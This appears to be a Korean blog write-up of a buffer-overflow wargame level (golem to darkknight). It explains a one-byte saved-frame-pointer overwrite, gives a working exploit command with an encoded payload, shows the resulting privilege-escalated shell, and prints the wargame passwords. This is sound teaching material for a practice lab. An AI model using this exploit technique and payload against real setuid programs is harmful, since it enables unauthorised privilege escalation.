---
layout: post
title: "[Wargame] 해커스쿨 BoF LEVEL12 (Golem -> Darkknight) : Sfp"
date: 2015-11-19 22:03:10
category: wargame
tags:  bof 
---

- id = golem
- pw = cup of coffee

<!--more--> 

## 1. 문제 : darkknight.c



```c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - darkknight
        - FPO
*/

#include <stdio.h>
#include <stdlib.h>

void problem_child(char *src)
{
        char buffer[40];
        strncpy(buffer, src, 41);
        printf("%s\n", buffer);
}

main(int argc, char *argv[])
{
        if(argc<2){
                printf("argv error\n");
                exit(0);
        }

        problem_child(argv[1]);
}
```

일단 가장 큰 차이점은 main() 함수안에서 problem_child() 라는 함수 안에서 buffer[40] 에 대한 strncpy(buffer, src, 41) 가 이루어진다. 이전에는 한 함수 안에서 stack 에 저장된 return address 를 변조하도록 공격하였는데, 이번에는 하나의 함수에서 이전에 저장한 stack frame register 를 변조하여, 이를 복구하는 이전 caller function 에서 복구시에 원하는 shellcode 위치로 jump 하도록 해야한다. 이를 위해서는 frame register, $ebp, 함수 preamble, postamble 등에 대해서 잘 이해해야한다.

### 1.3 main()

```
0x804846c <main>:       push   %ebp
0x804846d <main+1>:     mov    %esp,%ebp
0x804846f <main+3>:     cmpl   $0x1,0x8(%ebp)
0x8048473 <main+7>:     jg     0x8048490 <main+36>
0x8048475 <main+9>:     push   $0x8048504
0x804847a <main+14>:    call   0x8048354 <printf>
0x804847f <main+19>:    add    $0x4,%esp
0x8048482 <main+22>:    push   $0x0
0x8048484 <main+24>:    call   0x8048364 <exit>
0x8048489 <main+29>:    add    $0x4,%esp
0x804848c <main+32>:    lea    0x0(%esi,1),%esi
0x8048490 <main+36>:    mov    0xc(%ebp),%eax
0x8048493 <main+39>:    add    $0x4,%eax
0x8048496 <main+42>:    mov    (%eax),%edx
0x8048498 <main+44>:    push   %edx
0x8048499 <main+45>:    call   0x8048440 <problem_child>
0x804849e <main+50>:    add    $0x4,%esp
0x80484a1 <main+53>:    leave
0x80484a2 <main+54>:    ret
0x80484a3 <main+55>:    nop
0x80484a4 <main+56>:    nop
```

### 1.4 problem_child()

```
0x8048440 <problem_child>:      push   %ebp
0x8048441 <problem_child+1>:    mov    %esp,%ebp
0x8048443 <problem_child+3>:    sub    $0x28,%esp
0x8048446 <problem_child+6>:    push   $0x29
0x8048448 <problem_child+8>:    mov    0x8(%ebp),%eax
0x804844b <problem_child+11>:   push   %eax
0x804844c <problem_child+12>:   lea    0xffffffd8(%ebp),%eax
0x804844f <problem_child+15>:   push   %eax
0x8048450 <problem_child+16>:   call   0x8048374 <strncpy>
0x8048455 <problem_child+21>:   add    $0xc,%esp
0x8048458 <problem_child+24>:   lea    0xffffffd8(%ebp),%eax
0x804845b <problem_child+27>:   push   %eax
0x804845c <problem_child+28>:   push   $0x8048500
0x8048461 <problem_child+33>:   call   0x8048354 <printf>
0x8048466 <problem_child+38>:   add    $0x8,%esp
0x8048469 <problem_child+41>:   leave
0x804846a <problem_child+42>:   ret
0x804846b <problem_child+43>:   nop
```

## 2 함수 진입 & 복귀

이번 문제 풀이에서 가장 중요한 것은 기존 Frame Register가 어떻게 쓰이는 것을 이해하는 것이다. 기존과 달리 frame register를 이용한 공격하게 된다.

### 2.1 함수 내부 동작 : [A brief introduction to x86 calling conventions](http://codearcana.com/posts/2013/05/21/a-brief-introduction-to-x86-calling-conventions.html)

```
my_function:
  push %ebp              # Preamble: save the old %ebp.
  movl %esp, %ebp        # Point %ebp to the saved %ebp and the new stack frame.

  subl $0x4, %esp        # Reserve space for local variables.

  movl 0x8(%ebp), %eax   
  movl %eax, -0x4(%ebp)  # Move argument into local variable.

  # Function body. 

  addl $0x4, %esp        # Reclaim space used by local variables.

  leave                  # Epilogue: restore the old %ebp.
  ret
```

### 2.2 함수 진입

```
push %ebp             # Preamble: save the old %ebp.
mov %esp, %ebp         # Point %ebp to the saved %ebp and the new stack frame.
```


### 2.3 함수 jump

ARM 에서는 함수 jump 시에 return address 를 함수 prologue 에서 push rX, .., $lr stack push 를 해주었던 것 같은데, x86에서는 call function 이 알아서 해주는 듯 하다.

```
call function
```

### 2.4 leave() : [@stackoverflow: Why does leave do “mov esp,ebp” in x86 assembly?](http://stackoverflow.com/questions/5474355/why-does-leave-do-mov-esp-ebp-in-x86-assembly)

```
mov esp,ebp
pop ebp
```

### 2.5 ret()

```
pop eip
```

### 2.6 [x86 Call/Return Protocol](http://pages.cs.wisc.edu/~cs354-1/Handouts/Handout-CallReturn.pdf)

![img](https://raw.githubusercontent.com/humb1ec0ding/humb1ec0ding-etc/579f275f0c88410af2116ee22a08a1b572e4081b/2015/11/stage12-1.png)

```
| <argument 2>       |
| <argument 1>       |
| <return address>   |
| <old ebp>          | <= %ebp
| <local var 1>      |
| <local var 2>      | <= %esp
```

## 2. 공격

### 2.1 공격 방법 고민

여기서 중요한 점은 함수를 복귀시에 그전에 stack 에 저장해둔 saved $ebp 와 $lr 를 꺼내기 위하여 $esp를 saved $ebp 로 설정한 다음에 pop $ebp 하여 $ebp 를 설정하고 나서, 그 다음 word 에 있는 $lr 를 pop 하여 return 한다는 것이다. 즉, saved $ebp를 변조하면 함수 복귀 시의 주소 역시 바꿀 수 있다는 것이다.

### 2.2 공격

problem_child() 함수 안에서 buffer copy 시에 saved $ebp 의 마지막 한 바이트 값을 바꿀 수 있는데, 이는 main() 함수로 복귀한 이후에 saved $ebp 복원하는 과정에서 이 값으로 $esp 로 설정을 하여 pop 하여 $ebp 설정하고 (leave) 이후에 ret 시에 다음 +4 bytes 자리에 있는 값을 $eip로 설정하여 복귀하게 된다. 따라서 $ebp 값의 다음 word 자리의 값이 shellcode 가 위치한 두 번째 parameter 값이 있는 위치가 되도록 0xbffffdc8 로 선택하여 exploit 작성하였다.

![img](https://raw.githubusercontent.com/humb1ec0ding/humb1ec0ding-etc/master/2015/11/stage12-3.png)

```bash
./darkknight `python -c 'print "\xc8\xfd\xff\xbf" * 10 + "\x04"'`  `python -c 'print "\x90"*100 + "\x68\xf9\xbf\x0f\x40\x68\xe0\x91\x03\x40\xb8\xe0\x8a\x05\x40\x50\xc3"'`    
Èý ¿Èý ¿Èý ¿Èý ¿Èý ¿Èý ¿Èý ¿Èý ¿Èý ¿Èý ¿ü ¿
                                          ý ¿Xü ¿Ë      @
bash$   
bash$ id
uid=511(golem) gid=511(golem) euid=512(darkknight) egid=512(darkknight) groups=511(golem)
```

## 3. 다음 단계 정보

```bash
bash$ id
uid=511(golem) gid=511(golem) euid=512(darkknight) egid=512(darkknight) groups=511(golem)
bash$ my-pass
euid = 512
new attacker
```

## 4. 의문점

사실 아래가 처음에 공격 시도한 exploit 인데, 앞의 성공한 경우 거의 동일하다. 차이가 있다면 ret 시 설정되는 값 위치를 특정 위치 하나만 설정하고, 나머지는 NOP Sled 을 깔은 것인데, 이것이 동작하지 않는다는 것은… gdb 실행한 경우와 실제 실행하는 경우의 stack 이 조금 다르게 잡히기 때문에 복귀 주소가 잘못되는 듯하다.

이렇게 두 경우의 stack 위치가 달라지는 경우에 어떻게 처리를 해야할지 모르겠다. 일단은 NOP Sled이나 특정값을 반복시켜서 stack 위치가 약간 틀어져서 동작하도록 해야할 듯 하다.

![img](https://raw.githubusercontent.com/humb1ec0ding/humb1ec0ding-etc/master/2015/11/stage12-2.png)

```bash
./darkknight `python -c 'print "\x90"*20 + "\xc8\xfd\xff\xbf" * 4 + "\x04"*5'`  `python -c 'print "\x90"*100 + "\x68\xf9\xbf\x0f\x40\x68\xe0\x91\x03\x40\xb8\xe0\x8a\x05\x40\x50\xc3"'`
Èý ¿Èý ¿Èý ¿Èý ¿ü ¿
                  ý ¿Xü ¿Ë      @
Segmentation fault
```








